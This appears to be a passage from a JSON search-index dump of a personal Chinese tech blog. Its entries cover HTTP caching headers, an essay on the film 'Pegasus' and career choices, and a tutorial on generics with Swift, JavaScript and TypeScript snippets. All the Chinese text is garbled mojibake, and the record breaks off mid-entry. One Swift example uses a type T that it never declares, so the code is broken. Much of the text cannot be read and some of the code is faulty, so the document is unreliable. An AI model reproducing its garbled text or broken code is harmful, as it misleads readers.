åœ¨æ²¡æœ‰ç¼“å­˜æ•°æ®çš„æ—¶å€™ï¼Œæµè§ˆå™¨å‘æœåŠ¡å™¨è¯·æ±‚æ•°æ®æ—¶ï¼ŒæœåŠ¡å™¨ä¼šå°†æ•°æ®å’Œç¼“å­˜è§„åˆ™ä¸€å¹¶è¿”å›ï¼Œ ç¼“å­˜è§„åˆ™ä¿¡æ¯åŒ…å«åœ¨å“åº”headerä¸­\næµè§ˆå™¨æ˜¯å¦‚ä½•åˆ¤æ–­ç¼“å­˜æ•°æ®æ˜¯å¦å¤±æ•ˆå‘¢ å¼ºåˆ¶ç¼“å­˜æ¥æœºåˆ¶ä¸­ï¼Œå“åº”headerä¸­ä¼šæœ‰ä¸¤ä¸ªå­—æ®µæ¥æ ‡æ˜å¤±æ•ˆè§„åˆ™\nExpires/Cache-Control Expires æ˜¯HTTP 1.0çš„ä¸œè¥¿ï¼Œç°åœ¨é»˜è®¤æµè§ˆå™¨å‡é»˜è®¤ä½¿ç”¨HTTP 1.1ï¼Œæ‰€ä»¥å®ƒçš„ä½œç”¨åŸºæœ¬å¿½ç•¥ã€‚HTTP 1.1 çš„ç‰ˆæœ¬ä¸­ï¼Œä½¿ç”¨Cache-Controlæ›¿ä»£\n2.åå•†ç¼“å­˜ é¡¾åæ€ä¹‰ï¼Œéœ€è¦è¿›è¡Œæ¯”è¾ƒåˆ¤æ–­æ˜¯å¦å¯ä»¥ä½¿ç”¨ç¼“å­˜\né€šè¿‡ä¸¤å›¾çš„å¯¹æ¯”ï¼Œæˆ‘ä»¬å¯ä»¥å¾ˆæ¸…æ¥šçš„å‘ç°ï¼Œåœ¨å¯¹æ¯”ç¼“å­˜ç”Ÿæ•ˆæ—¶ï¼ŒçŠ¶æ€ç ä¸º304ï¼Œå¹¶ä¸”æŠ¥æ–‡å¤§å°å’Œè¯·æ±‚æ—¶é—´å¤§å¤§å‡å°‘ã€‚ åŸå› æ˜¯ï¼ŒæœåŠ¡ç«¯åœ¨è¿›è¡Œæ ‡è¯†æ¯”è¾ƒåï¼Œåªè¿”å›headeréƒ¨åˆ†ï¼Œé€šè¿‡çŠ¶æ€ç é€šçŸ¥å®¢æˆ·ç«¯ä½¿ç”¨ç¼“å­˜ï¼Œä¸å†éœ€è¦å°†æŠ¥æ–‡ä¸»ä½“éƒ¨åˆ†è¿”å›ç»™å®¢æˆ·ç«¯\nå¯¹æ¯”ç¼“å­˜æ ‡è¯†ä¸€å…±åˆ†ä¸ºä¸¤ç§æ ‡è¯†ä¼ é€’:\nLast-Modified / If-Modified-Since Etag / If-None-Matchï¼ˆä¼˜å…ˆçº§é«˜äºLast-Modified / If-Modified-Sinceï¼‰ Etag\næœåŠ¡å™¨å“åº”è¯·æ±‚æ—¶ï¼Œå‘Šè¯‰æµè§ˆå™¨å½“å‰èµ„æºåœ¨æœåŠ¡å™¨çš„å”¯ä¸€æ ‡è¯†ï¼ˆç”Ÿæˆè§„åˆ™ç”±æœåŠ¡å™¨å†³å®šï¼‰ If-None-Match\nå†æ¬¡è¯·æ±‚æœåŠ¡å™¨æ—¶ï¼Œé€šè¿‡æ­¤å­—æ®µé€šçŸ¥æœåŠ¡å™¨å®¢æˆ·æ®µç¼“å­˜æ•°æ®çš„å”¯ä¸€æ ‡è¯†\næœåŠ¡å™¨æ”¶åˆ°è¯·æ±‚åå‘ç°æœ‰å¤´If-None-Match åˆ™ä¸è¢«è¯·æ±‚èµ„æºçš„å”¯ä¸€æ ‡è¯†è¿›è¡Œæ¯”å¯¹ï¼Œ ä¸åŒï¼Œè¯´æ˜èµ„æºåˆè¢«æ”¹åŠ¨è¿‡ï¼Œåˆ™å“åº”æ•´ç‰‡èµ„æºå†…å®¹ï¼Œè¿”å›çŠ¶æ€ç 200ï¼› ç›¸åŒï¼Œè¯´æ˜èµ„æºæ— æ–°ä¿®æ”¹ï¼Œåˆ™å“åº”HTTP 304ï¼Œå‘ŠçŸ¥æµè§ˆå™¨ç»§ç»­ä½¿ç”¨æ‰€ä¿å­˜çš„cache\nä¸‰ã€æ€»ç»“ 1.ç¼“å­˜ä½¿ç”¨è§„åˆ™ å¯¹äºå¼ºåˆ¶ç¼“å­˜ï¼ŒæœåŠ¡å™¨é€šçŸ¥æµè§ˆå™¨ä¸€ä¸ªç¼“å­˜æ—¶é—´ï¼Œåœ¨ç¼“å­˜æ—¶é—´å†…ï¼Œä¸‹æ¬¡è¯·æ±‚ï¼Œç›´æ¥ç”¨ç¼“å­˜ï¼Œä¸åœ¨æ—¶é—´å†…ï¼Œæ‰§è¡Œæ¯”è¾ƒç¼“å­˜ç­–ç•¥ å¯¹äºæ¯”è¾ƒç¼“å­˜ï¼Œå°†ç¼“å­˜ä¿¡æ¯ä¸­çš„Etagå’ŒLast-Modifiedé€šè¿‡è¯·æ±‚å‘é€ç»™æœåŠ¡å™¨ï¼Œç”±æœåŠ¡å™¨æ ¡éªŒï¼Œè¿”å›304çŠ¶æ€ç æ—¶ï¼Œæµè§ˆå™¨ç›´æ¥ä½¿ç”¨ç¼“å­˜ 2.æµè§ˆå™¨è¯·æ±‚ æœ€åï¼Œ å¸Œæœ›å¤§å®¶æ—©æ—¥å®ç°ï¼šæˆä¸ºç¼–ç¨‹é«˜æ‰‹çš„ä¼Ÿå¤§æ¢¦æƒ³ï¼ æ¬¢è¿äº¤æµ~\nå‚è€ƒæ–‡ç« : å½»åº•å¼„æ‡‚HTTPç¼“å­˜æœºåˆ¶åŠåŸç†\næœ¬æ–‡ç‰ˆæƒå½’åŸä½œè€…æ›œçµæ‰€æœ‰ï¼æœªç»å…è®¸ï¼Œä¸¥ç¦è½¬è½½ï¼å¯¹éæ³•è½¬è½½è€…, åŸä½œè€…ä¿ç•™é‡‡ç”¨æ³•å¾‹æ‰‹æ®µè¿½ç©¶çš„æƒåˆ©ï¼ è‹¥éœ€è½¬è½½ï¼Œè¯·è”ç³»å¾®ä¿¡å…¬ä¼—å·ï¼šè¿å…ˆç”Ÿæœ‰çŒ«ç—…ï¼Œå¯è·å–ä½œè€…è”ç³»æ–¹å¼ï¼\n","permalink":"https://lianpf.github.io/posts/computer-basics/04.http-cache/","summary":"å¤§å®¶ä¸åº”è¯¥ä»…ä»…å±€é™äºçŸ¥é“æµè§ˆå™¨ä¼šå¯¹è¯·æ±‚çš„é™æ€æ–‡ä»¶è¿›è¡Œç¼“å­˜, ä½†","title":"ç½‘ç»œåŸç†: httpç¼“å­˜æœºåˆ¶åŠå…¶åŸç†"},{"content":"æœ€å¥½çš„å–œå‰§æ°¸è¿œæ˜¯æ‚²å‰§? å¼ å¼›åœ¨å¤•é˜³ä¸‹é©¾è½¦é£ä¸‹æ‚¬å´–æ˜¯æœ€å¥½çš„ç»“å±€? å¤§æ¦‚æ¯ä¸ªäººå¿ƒåº•éƒ½æœ‰ä¸€ä»½ä¸å®Œå…¨ç›¸åŒçš„ç­”æ¡ˆå§ï¼\nå–œå‰§çš„å†…æ ¸æ°¸è¿œæ˜¯æ‚²å‰§? æœ‰äººè¯´, å–œå‰§çš„å†…æ ¸æ°¸è¿œæ˜¯æ‚²å‰§, é»˜å‰§å¤§å¸ˆå¶é€¢æ˜¥çš„èŠ‚ç›®æ‰æ’‘å¾—ä¸ŠçœŸæ­£çš„å–œå‰§ã€‚å½“ç„¶, æˆ‘ä¸ªäººå¾ˆå–œæ¬¢ä»–çš„èŠ‚ç›®, ä½†æ˜¯å¯¹äºè¿™æ ·çš„è§‚ç‚¹å´ä»ç„¶ä¸æ•¢è‹ŸåŒã€‚æ‰€ä»¥ï¼Œ æˆ‘åªèƒ½å¤§æ¦‚çŒœæµ‹ä¸€ä¸‹è¿™éƒ¨åˆ†å—ä¼—çš„å¿ƒç†å’Œè§’åº¦, æ˜¯å› ä¸ºå–œå‰§åˆ°æ‚²å‰§çš„è½¬æŠ˜è®©å–œå‰§æœ¬èº«æ˜¾çš„åˆ«å…·ä¸€æ ¼ï¼Ÿæ˜¯å› ä¸ºè¿™éƒ¨åˆ†çš„å–œå‰§é€šå¸¸ä¼šèµ°è¿›ä½ çš„å†…å¿ƒ, è§¦åŠ¨ä½ å¿ƒåº•çš„æŸç‰‡æŸ”è½¯ï¼ŒæŒ¥ç€é¡¿æ—¶å½»æ‚Ÿï¼Ÿè¿˜æ˜¯è®©ä½ æ”¶è·äº†è¿™ä¸–é—´æœ€éš¾å¾—ä¹Ÿæœ€ç®€å•çš„å¿«ä¹?\nåœ¨çœ‹ã€Šé£é©°äººç”Ÿã€‹çš„æ—¶å€™, å¼ é©°å›åˆ°é©¾æ ¡é‡æ–°ç»ƒè½¦çš„æ—¶å€™ï¼Œé‚£ä¸ªè¯™è°çš„ç‰‡æ®µ, å·®ç‚¹å„¿ç»™æˆ‘ç¬‘ç–¯; ä¸€ä¸ªæ›¾ç»åœ¨èµ›è½¦èŠ‚å±å’¤é£äº‘çš„èµ›è½¦æ‰‹å› ç¦èµ›è€Œåªèƒ½åœ¨ç»è¥ç‚’é¥­å¤§æ’æ¡£çš„é—´éš™, ç”¨é©¬æ¡¶å¡å­å’Œè„¸ç›†ç»ƒè½¦çš„é‚£äº”å¹´ä¹Ÿ è§¦ç¢°åˆ°äº†æˆ‘å¿ƒé‡Œçš„é‚£ç‰‡æŸ”è½¯, å³ä½¿æ²¡æœ‰æ‰€è°“çš„é¡¿æ‚Ÿ, æˆ‘ä¹Ÿå¾ˆå–œæ¬¢; åœ¨ç”µå½±çš„æœ€åä¸€å¹•, å¤•é˜³ä¹‹ä¸‹ï¼Œå¼ é©°é©¾è½¦é£ä¸‹æ‚¬å´–ï¼Œ â€œä¸ºäº†æ‰€çƒ­çˆ±çš„äº‹æƒ…ï¼Œå¥‰çŒ®ä½ çš„ä¸€åˆ‡â€, è¿™ä¸ªå’Œå–œå‰§æœ¬èº«å·¨å¤§åè½¬çš„ç»“å±€è®©æˆ‘éœ‡æ„Ÿ, å–œæ¬¢å´åˆä¸å–œæ¬¢ã€‚\næ‰€ä»¥, æœ€å¥½çš„å–œå‰§ä¸€å®šè¦æ˜¯æ‚²å‰§ä¹ˆï¼Ÿ ä¹Ÿè®¸æ˜¯, ä¹Ÿè®¸ä¹Ÿä¸æ˜¯å§ï¼\nå¯¹æˆ‘æ¥è¯´ï¼Œå·´éŸ³å¸ƒé²å…‹æ²¡æœ‰æµ·ï¼Œheroes never die åœ¨ç”µå½±æœ€åä¸€å¹•, å¤•é˜³ä¹‹ä¸‹, ä¼´éšç€ã€Šå¥‰çŒ®ã€‹çš„èƒŒæ™¯éŸ³ä¹, å¼ å¼›é©¾è½¦é£ä¸‹äº†æ‚¬å´–, \u0026ldquo;ä¸ºäº†æ‰€çƒ­çˆ±çš„äº‹æƒ…ï¼Œå¥‰çŒ®ä½ çš„ä¸€åˆ‡\u0026rdquo;ã€‚\nè¿™ä¸ªç”»é¢è®©æˆ‘å›åˆ°äº†å°‘å¹´æ—¶ä»£çš„çƒ­è¡€æ¾æ¹ƒ, \u0026ldquo;æ¢¦æƒ³å’ŒåšæŒ\u0026quot;ç»ˆäºæœ‰äº†æœ€å¥½çš„ç»“å±€, ä¹Ÿåœç•™åœ¨äº†å¼ å¼›æœ€å¥½çš„é˜¶æ®µã€‚ ç„¶è€Œå½±ç‰‡æœ€åçš„å½©è›‹å‘Šè¯‰, å†³æˆ˜æ—¶ï¼Œå„¿å­å¼ é£å°†ä¸€ä¸ªç¡¬å¸æŠ•è¿›è½¦é‡Œï¼Œèµ›è½¦å˜æˆäº†é£æœºï¼Œé£ä¸Šäº†å¤©ç©º, èƒŒæ™¯éŸ³ä¹å­—å¹•å‡ºç°ï¼‚Heroes never dieï¼‚ã€‚\nå¯¹æˆ‘æ¥è¯´ï¼Œæˆ‘è´ªå¿ƒçš„ç›¸ä¿¡, å·´éŸ³å¸ƒé²å…‹æ²¡æœ‰æµ·ï¼Œheroes never dieã€‚\nè¯·ç›¸ä¿¡ä½ äººç”Ÿçš„æ¯ä¸ªé˜¶æ®µå†…å¿ƒæ—¶åˆ»æ‰€ç›¸ä¿¡çš„ æœ€è¿‘, æˆ‘çœ‹åˆ°ä¸€ä¸ªå¾ˆæœ‰æ„æ€çš„æƒ³æ³•(åœ¨æ­¤ä¸é’ˆå¯¹ä»»ä½•å’Œè¿™ä¸ªæƒ…æ™¯ç›¸å…³çš„äºº, è¯·ä¸è¦å¯¹å·å…¥åº§)ã€‚ ä¸€ä¸ªå·²ç»è¿›å…¥ç¤¾ä¼šå·¥ä½œçš„ç¨‹åºçŒ¿, æƒ³è¦è„±ç¦»ç°åœ¨çš„é˜¶å±‚æˆ–è€…è¯´ç¯å¢ƒ, é€‰æ‹©å»è€ƒç ”æ·±é€ , æ¥è§¦\u0026quot;æ›´æ·±å±‚æ¬¡\u0026rdquo; çš„ç ”ç©¶ç”ŸåŒå­¦å’Œå¯¼å¸ˆã€‚\nå½“ç„¶, è¿™ä¸ªè§‚ç‚¹æœ¬èº«å¹¶æ²¡æœ‰ä»€ä¹ˆè®©æˆ‘ä¸èˆ’æœçš„åœ°æ–¹ã€‚æºå“¥åœ¨æ±•å¤´, æŸ¯æ€»åœ¨é¦™æ¸¯, æˆ‘çš„å¾ˆå¤šæœ‹å‹ä¹Ÿéƒ½ é€‰æ‹©åœ¨é«˜æ ¡æ·±é€ ã€‚åœ¨æˆ‘çœ‹æ¥, ä½œä¸ºæŠ€æœ¯äºº, æ˜¯é å‡ å¹´çš„é¡¹ç›®ç»éªŒç§¯ç´¯ç„¶åå»å¤§å‚æ·±é€ æˆ–è€…ç›´æ¥è€ƒç ”è¯»åšæ·±é€ , åªæ˜¯é€‰æ‹©çš„å·®å¼‚, æœ¬èº«å¹¶æ²¡æœ‰ä»€ä¹ˆåŒºåˆ«ã€‚\nè¿™ä¸ªå“¥ä»¬å¾ˆæœ‰æ„æ€çš„ä¸€ä¸ªè§‚ç‚¹æ˜¯, åœ¨æœ‰ä¸ªæœ‹å‹ç»™ä»–æ¨èå»BATã€TMDç­‰å¤§å‚ç ”ä¹ æŠ€æœ¯çš„æ—¶å€™, ä»– åŠå¯¹æ–¹è¦è½¬å˜æ€è·¯, è€ƒç ”æ‰èƒ½é¢„è§æ›´æœ‰å±‚æ¬¡çš„äººç¾¤, æ„æ€æ˜¯å³ä½¿è¿›äº†å¤§å‚çš„é‚£äº›å¤§ä½¬ä¹Ÿè¿˜æ˜¯è¿™ä¸ªå±‚æ¬¡?\næš‚ä¸”ä¸è¯´, è¿™ä½å°å“¥, ä½ æ˜¯ä¸æ˜¯å¯¹å¤§å‚çš„å®åŠ›æœ‰ä»€ä¹ˆè¯¯è§£ï¼Ÿ é˜¿é‡Œäº‘çš„ç½‘ç»œä¸“å®¶\u0026quot;é“å“¥\u0026quot;, æ™®åº¦ä¼—çŒ¿å­¦ä¹ çš„\u0026quot;é˜®ä¸€å³°\u0026quot;è€å¸ˆä½ æ˜¯æ²¡å¬è¿‡ä¹ˆï¼Ÿè¿˜æ˜¯, èš‚èšé‡‘æœçš„å¼€æºé¡¹ç›®ç»™ä¼ä¸šå¸¦æ¥äº†å¤šå°‘ç¦éŸ³, ä½ ä¸€ä¸ä¸€æ¯«éƒ½ä¸çŸ¥é“ï¼Ÿ å›½å†…å¤–é‚£äº›ä¼˜ç§€çš„æŠ€æœ¯å›¢é˜Ÿ, å³ä½¿ç§‘ç ”èƒ½åŠ›ä¸æ•¢å’Œé‚£äº›çŸ¥åçš„è®¡ç®—æœºå¤§å­¦æ•™æˆç›¸æ¯”, ä½†æ˜¯åœ¨å®è·µåº”ç”¨æ–¹é¢, æ˜¯ä»–ä»¬å®ˆæŠ¤ç€æ•´ä¸ªä¸–ç•Œçš„äº’è”ç½‘ç§©åºå’Œå®‰å…¨, ç”šè‡³åœ¨æ‰¿æ‹…ç€æ”¿åºœçš„ç¤¾ä¼šèŒèƒ½å§ï¼\nè€Œä¸”, ä½ æ˜¯è®¤çœŸçš„ä¹ˆ, è€ƒå®Œäº†è®¡ç®—æœºçš„ç ”ç©¶ç”Ÿ, é™¤äº†å»ç ”ç©¶é™¢(æ¦‚ç‡å¾®ä¹å…¶å¾®), ä½ å¤§æ¦‚ç‡è¿˜æ˜¯ è¦ç»§ç»­åœ¨ç¨‹åºçŒ¿çš„å¤§å†›ä¸­æ·±é€ çš„å§ï¼æ‰€ä»¥, ä½ çš„å°è„‘ç“œå­åˆ°åº•åœ¨æƒ³ä»€ä¹ˆ?\nåœ¨æˆ‘çœ‹æ¥, å¤§å‚çš„æŠ€æœ¯ç¯å¢ƒå’Œèƒ½åŠ›, å³ä½¿ä¸æ•¢è¯´æ¯”å­¦é™¢æ´¾ä¹‹ä¸Š, ä½†æ˜¯ä¹Ÿä¸ä¼šé€Šè‰²çš„å§ï¼\næ›´ä¸ºé‡è¦çš„æ˜¯, è®©ä½ æˆé•¿çš„, ç¯å¢ƒèµ·åˆ°çš„å·¦å³ä¸èƒ½è¯´å¾®ä¹å…¶å¾®, æœ€å¤šä¹Ÿåªèƒ½ç®—æ˜¯å¼•å¯¼çš„åœ°æ­¥å§ã€‚ä½ åœ¨å­¦æ ¡ æ·±é€ çš„å†…å®¹, é‡åˆ°æ›´é«˜å±‚æ¬¡çš„äºº, æ€»å½’è¦åº”ç”¨äºç°å®ã€‚\nåœ¨ä½ çœ‹æ¥, ä½ æ˜¯å¯¹çš„; åœ¨æˆ‘çœ‹æ¥, æˆ‘çš„æ›´æ²¡æœ‰é”™ï¼\næ¯ä¸ªäºº, æ¯ä»¶äº‹ï¼Œ æ¯ä¸ªä½ æˆé•¿çš„é˜¶æ®µ, éƒ½åº”è¯¥æœ‰è‡ªå·±ç†è§£ï¼Œå¹¶ä¸”è¯·ç›¸ä¿¡ä½ çš„ç†è§£!\næœ€åï¼Œ å¸Œæœ›å¤§å®¶æ—©æ—¥å®ç°ï¼šæˆä¸ºç¼–ç¨‹é«˜æ‰‹çš„ä¼Ÿå¤§æ¢¦æƒ³ï¼ æ¬¢è¿äº¤æµ~\nå‚è€ƒ ã€Šé£é©°äººç”Ÿã€‹ç»“å°¾æˆè¿·ï¼Œä½ çœ‹æ‡‚äº†å—ï¼Ÿ éŸ©å¯’å›åº”ã€Šé£é©°äººç”Ÿã€‹ç»“å±€ï¼šæ¯ä¸ªäººéƒ½æœ‰è‡ªå·±ç†è§£ï¼Œè¯·ç›¸ä¿¡ä½ çš„ç†è§£ æœ¬æ–‡ç‰ˆæƒå½’åŸä½œè€…æ›œçµæ‰€æœ‰ï¼æœªç»å…è®¸ï¼Œä¸¥ç¦è½¬è½½ï¼å¯¹éæ³•è½¬è½½è€…, åŸä½œè€…ä¿ç•™é‡‡ç”¨æ³•å¾‹æ‰‹æ®µè¿½ç©¶çš„æƒåˆ©ï¼ è‹¥éœ€è½¬è½½ï¼Œè¯·è”ç³»å¾®ä¿¡å…¬ä¼—å·ï¼šè¿å…ˆç”Ÿæœ‰çŒ«ç—…ï¼Œå¯è·å–ä½œè€…è”ç³»æ–¹å¼ï¼\n","permalink":"https://lianpf.github.io/posts/other/article-nolongertoleratetragedies/","summary":"æœ€å¥½çš„å–œå‰§æ°¸è¿œæ˜¯æ‚²å‰§? å¼ å¼›åœ¨å¤•é˜³ä¸‹é©¾è½¦é£ä¸‹æ‚¬å´–æ˜¯æœ€å¥½çš„ç»“å±€?","title":"å†ä¹Ÿçœ‹ä¸æƒ¯æ‚²å‰§çš„æˆ‘ä»¬-ã€Šé£é©°äººç”Ÿã€‹"},{"content":" \u0026ldquo;æ³›å‹\u0026rdquo;, è®¡ç®—æœºç¼–ç¨‹ä¸­, ä¸€ä¸ªå¿…ä¸å¯å°‘çš„æ¦‚å¿µã€‚\nç®€å•ç†è§£æ³›å‹ ä»€ä¹ˆæ˜¯æ³›å‹ æ³›å‹æ˜¯ç¨‹åºè®¾è®¡è¯­è¨€çš„ä¸€ç§ç‰¹æ€§ã€‚é€šè¿‡å‚æ•°åŒ–ç±»å‹æ¥å®ç°åœ¨åŒä¸€ä»½ä»£ç ä¸Šæ“ä½œå¤šç§æ•°æ®ç±»å‹ã€‚\nå¯¹äºå¼ºç±»å‹è¯­è¨€æ¥ä¹¦, æåˆ°å‚æ•°ï¼Œæœ€ç†Ÿæ‚‰ä¸è¿‡çš„å°±æ˜¯å®šä¹‰ function A æ—¶æœ‰å½¢å‚ï¼Œç„¶åè°ƒç”¨ A æ—¶ä¼ é€’å®å‚ã€‚ æŒ‡å®šä¸€ä¸ªè¡¨ç¤ºç±»å‹çš„å˜é‡ï¼Œç”¨å®ƒæ¥ä»£æ›¿æŸä¸ªå®é™…çš„ç±»å‹ç”¨äºç¼–ç¨‹ï¼Œè€Œåé€šè¿‡å®é™…è°ƒç”¨æ—¶ä¼ å…¥ç±»å‹ æ¥å¯¹å…¶è¿›è¡Œæ›¿æ¢ï¼Œä»¥è¾¾åˆ°ä¸€æ®µä½¿ç”¨æ³›å‹ç¨‹åºå¯ä»¥å®é™…é€‚åº”ä¸åŒç±»å‹çš„ç›®çš„ã€‚\næ³¨: å„ç§ç¨‹åºè®¾è®¡è¯­è¨€å’Œå…¶ç¼–è¯‘å™¨ã€è¿è¡Œç¯å¢ƒå¯¹æ³›å‹çš„æ”¯æŒå‡ä¸ä¸€æ ·\næ³›å‹è§£å†³çš„é—®é¢˜ å¯é‡ç”¨æ€§ ç±»å‹å’Œç®—æ³•å®‰å…¨ æ•ˆç‡ è¿™æ˜¯éæ³›å‹ç±»å’Œéæ³›å‹æ–¹æ³•æ— æ³•å…·å¤‡çš„\nå¸¸è§çš„æƒ…å½¢ ä½ æœ‰ä¸€ä¸ªå‡½æ•°ï¼Œå®ƒå¸¦æœ‰ä¸€ä¸ªå‚æ•°ï¼Œå‚æ•°ç±»å‹æ˜¯Aï¼Œç„¶è€Œå½“å‚æ•°ç±»å‹æ”¹å˜æˆBçš„æ—¶å€™ï¼Œä½ ä¸å¾—ä¸å¤åˆ¶è¿™ä¸ªå‡½æ•°\nä¾‹å¦‚ï¼Œä¸‹é¢çš„ä»£ç ä¸­ç¬¬äºŒä¸ªå‡½æ•°å°±æ˜¯å¤åˆ¶ç¬¬ä¸€ä¸ªå‡½æ•°â€”â€”å®ƒä»…ä»…æ˜¯ç”¨Stringç±»å‹ä»£æ›¿äº†Integerç±»å‹\nfunc areIntEqual(x: Int, _ y: Int) -\u0026gt; Bool { return x == y } func areStringsEqual(x: String, _ y: String) -\u0026gt; Bool { return x == y } areStringsEqual(\u0026#34;ray\u0026#34;, \u0026#34;ray\u0026#34;) // true areIntEqual(1, 1) // true é€šè¿‡é‡‡ç”¨æ³›å‹,å¯ä»¥åˆå¹¶è¿™ä¸¤ä¸ªå‡½æ•°ä¸ºä¸€ä¸ªå¹¶åŒæ—¶ä¿æŒç±»å‹å®‰å…¨ã€‚ä¸‹é¢æ˜¯ä»£ç å®ç°\n// ç”¨ä¸€ä¸ªé€šç”¨çš„æ•°æ®ç±»å‹Tæ¥ä½œä¸ºä¸€ä¸ªå ä½ç¬¦ï¼Œç­‰å¾…åœ¨å®ä¾‹åŒ–æ—¶ç”¨ä¸€ä¸ªå®é™…çš„ç±»å‹æ¥ä»£æ›¿ func areTheyEqual(x: T, _ y: T) -\u0026gt; Bool { return x == y } areTheyEqual(\u0026#34;ray\u0026#34;, \u0026#34;ray\u0026#34;) areTheyEqual(1, 1) JavaScriptå’Œæ³›å‹çš„å¯¹åº”å…³ç³» æ³›å‹ å’Œ æ¨¡æ¿æ–¹æ³•(è®¾è®¡)æ¨¡å¼ åœ¨ä¸€ä¸ªç³»åˆ—çš„è¡Œä¸ºä¸­ï¼Œæœ‰ä¸€äº›æ˜¯ç¡®å®šçš„ï¼Œæœ‰ä¸€äº›æ˜¯ä¸æ˜ç¡®çš„ï¼Œæˆ‘ä»¬æŠŠç¡®å®šçš„è¡Œä¸ºå®šä¹‰åœ¨ä¸€ä¸ªæŠ½è±¡ç±»ä¸­ï¼Œ ä¸ç¡®å®šçš„è¡Œä¸ºå®šä¹‰ä¸ºæŠ½è±¡æ–¹æ³•ï¼Œç”±å…·ä½“çš„å­ç±»å»å®ç°ï¼Œè¿™ç§ä¸å½±å“æ•´ä¸ªæµç¨‹ï¼Œä½†å¯ä»¥åº”å¯¹å„ç§æƒ…å†µçš„æ–¹æ³• å°±å¯ä»¥ç§°ä¹‹ä¸ºæ¨¡æ¿æ–¹æ³•æ¨¡å¼\ndemo - Coffee or Tea\nå‡ ä¸ªæ­¥éª¤:\næŠŠæ°´ç…®æ²¸ ç”¨æ²¸æ°´æµ¸æ³¡èŒ¶å¶ æŠŠèŒ¶æ°´å€’è¿›æ¯å­ åŠ æŸ æª¬ /* æŠ½è±¡çˆ¶ç±»ï¼šé¥®æ–™ */ var Beverage = function(){}; Beverage.prototype.boilWater = function() { console.log(\u0026#34;æŠŠæ°´ç…®æ²¸\u0026#34;); }; Beverage.prototype.brew = function() { throw new Error(\u0026#34;å­ç±»å¿…é¡»é‡å†™brewæ–¹æ³•\u0026#34;); }; Beverage.prototype.pourInCup = function() { throw new Error(\u0026#34;å­ç±»å¿…é¡»é‡å†™pourInCupæ–¹æ³•\u0026#34;); }; Beverage.prototype.addCondiments = function() { throw new Error(\u0026#34;å­ç±»å¿…é¡»é‡å†™addCondimentsæ–¹æ³•\u0026#34;); }; /* æ¨¡æ¿æ–¹æ³• */ Beverage.prototype.init = function() { this.boilWater(); this.brew(); this.pourInCup(); this.addCondiments(); } /* ------------åˆ†å‰²çº¿------------ */ /* å®ç°å­ç±» Coffee*/ var Coffee = function(){}; Coffee.prototype = new Beverage(); // é‡å†™éå…¬æœ‰æ–¹æ³• Coffee.prototype.brew = function() { console.log(\u0026#34;ç”¨æ²¸æ°´å†²æ³¡å’–å•¡\u0026#34;); }; Coffee.prototype.pourInCup = function() { console.log(\u0026#34;æŠŠå’–å•¡å€’è¿›æ¯å­\u0026#34;); }; Coffee.prototype.addCondiments = function() { console.log(\u0026#34;åŠ ç‰›å¥¶\u0026#34;); }; var coffee = new Coffee(); coffee.init(); /* å®ç°å­ç±» Tea*/ var Tea = function(){}; Tea.prototype = new Beverage(); // é‡å†™éå…¬æœ‰æ–¹æ³• Tea.prototype.brew = function() { console.log(\u0026#34;ç”¨æ²¸æ°´å†²æ³¡èŒ¶å¶\u0026#34;); }; Tea.prototype.pourInCup = function() { console.log(\u0026#34;æŠŠèŒ¶å€’è¿›æ¯å­\u0026#34;); }; Tea.prototype.addCondiments = function() { console.log(\u0026#34;åŠ æŸ æª¬\u0026#34;); }; var tea = new Tea(); tea.init(); è¿™é‡Œçš„Beverage.prototype.initå°±æ˜¯æ‰€è°“çš„æ¨¡æ¿æ–¹æ³•\nå®ƒä½œä¸ºä¸€ä¸ªç®—æ³•çš„æ¨¡æ¿æŒ‡å¯¼å­ç±»ä»¥ä½•ç§é¡ºåºå»æ‰§è¡Œå“ªäº›æ–¹æ³•ï¼Œåœ¨å…¶å†…éƒ¨ï¼Œç®—æ³•å†…çš„æ¯ä¸€ ä¸ªæ­¥éª¤éƒ½æ¸…æ¥šçš„å±•ç¤ºåœ¨æˆ‘ä»¬çœ¼å‰\næ³›å‹ å’Œ TypeScript æ³›å‹å‡½æ•° æ³›å‹ç±» TypeScript ä¸º JavaScriopt å¸¦æ¥äº†å¼ºç±»å‹ç‰¹æ€§ï¼Œä½†è¿™å°±æ„å‘³ç€é™åˆ¶äº†ç±»å‹çš„è‡ªç”±åº¦ã€‚åŒä¸€æ®µç¨‹åºï¼Œ ä¸ºäº†é€‚åº”ä¸åŒçš„ç±»å‹ï¼Œå°±å¯èƒ½éœ€è¦å†™ä¸åŒçš„å¤„ç†å‡½æ•°\nè€Œä¸”è¿™äº›å¤„ç†å‡½æ•°ä¸­æ‰€æœ‰é€»è¾‘å®Œå…¨ç›¸åŒï¼Œå”¯ä¸€ä¸åŒçš„å°±æ˜¯ç±»å‹â€”â€”è¿™ä¸¥é‡è¿åæŠ½è±¡å’Œå¤ç”¨ä»£ç çš„åŸåˆ™\næ³›å‹å‡½æ•° jsæºç \nvar service = { getStringValue: function() { return \u0026#34;a string value\u0026#34;; }, getNumberValue: function() { return 20; } }; function middleware(value) { console.log(value); return value; } var sValue = middleware(service.getStringValue()); var nValue = middleware(service.getNumberValue()); tsæ”¹å†™ä½¿ç”¨æ³›å‹\nconst service = { getStringValue(): string { return \u0026#34;a string value\u0026#34;; }, getNumberValue(): number { return 20; } }; // æ³›å‹æ–¹æ³•æ”¹é€  function middleware\u0026lt;T\u0026gt;(value: T): T { console.log(value); return value; } var sValue = middleware(service.getStringValue()); var nValue = middleware(service.getNumberValue()); middleware åé¢ç´§æ¥çš„\u0026lt;T\u0026gt;è¡¨ç¤ºå£°æ˜ä¸€ä¸ªè¡¨ç¤ºç±»å‹çš„å˜é‡ï¼ŒValue: T è¡¨ç¤ºå£°æ˜å‚æ•°æ˜¯ T ç±»å‹çš„ï¼Œ åé¢çš„ : T è¡¨ç¤ºè¿”å›å€¼ä¹Ÿæ˜¯ T ç±»å‹çš„ åˆ°è¿™é‡Œä¸ºæ­¢, TSæ”¹é€ ä¹‹åçš„æ³›å‹æ–¹æ³•å’Œæ”¹é€ ä¹‹å‰çš„jsä»£ç æ²¡ä»€ä¹ˆåŒºåˆ«ã€‚ ç°åœ¨çš„é—®é¢˜æ˜¯ middleware è¦æ€ä¹ˆæ ·å®šä¹‰æ‰æ—¢å¯èƒ½è¿”å› stringï¼Œåˆå¯èƒ½è¿”å› numberï¼Œè€Œä¸”è¿˜èƒ½è¢«ç±»å‹æ£€æŸ¥æ­£ç¡®æ¨å¯¼å‡ºæ¥ï¼Ÿ 